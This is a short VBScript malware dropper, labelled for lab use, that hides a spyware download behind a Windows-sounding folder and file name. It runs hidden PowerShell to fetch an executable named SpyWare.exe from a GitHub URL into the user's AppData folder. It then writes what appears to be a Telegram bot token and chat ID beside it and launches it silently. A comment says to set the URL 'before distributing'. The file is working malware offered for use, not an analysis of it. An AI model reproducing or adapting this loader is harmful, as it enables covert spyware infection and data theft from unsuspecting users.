' dropper.vbs — staged payload loader (LAB / EDUCATIONAL USE ONLY)
' ~600 bytes. Downloads payload exe + creates .env, then runs it silently.
' Set PAYLOAD_URL before distributing.

PAYLOAD_URL = "https://raw.githubusercontent.com/manwithattention/main/dist/SpyWare.exe"

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
destDir = appdata & "\WindowsSecurity"
destExe = destDir & "\wsmgr.exe"

' Download + run, all hidden (window style 0)
If Not fso.FolderExists(destDir) Then fso.CreateFolder(destDir)

sh.Run "powershell -w hidden -nop -c ""[Net.ServicePointManager]::SecurityProtocol='Tls12'; iwr '" & PAYLOAD_URL & "' -O '" & destExe & "'""", 0, True

' Write .env next to payload (edit values below)
Set envFile = fso.CreateTextFile(destDir & "\.env", True)
envFile.WriteLine "BOT_TOKEN=8306380276:AAHo7cJ6HZ6v3jz71cYGR-c0nBDKtva3_uw"
envFile.WriteLine "CHAT_ID=1036638753"
envFile.Close

sh.Run """" & destExe & """", 0, False
